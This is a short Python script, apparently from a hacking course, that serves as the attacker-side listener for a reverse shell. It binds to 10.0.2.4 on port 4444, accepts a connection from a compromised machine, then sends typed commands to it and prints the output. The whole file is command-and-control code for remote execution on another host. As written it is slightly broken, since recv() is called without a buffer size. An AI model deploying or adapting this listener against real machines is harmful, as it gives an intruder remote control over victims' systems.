#!/usr/bin/env python

import socket


# class Listener:
#     def __init__(self):

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("10.0.2.4", 4444))
listener.listen(0)
print("[+] Waiting for incoming connections")
connection, address = listener.accept()
print("[+] Got a connection from " + str(address))

while True:
    command = raw_input(">> ")
    connection.send(command)
    result = connection.recv()
    print(result)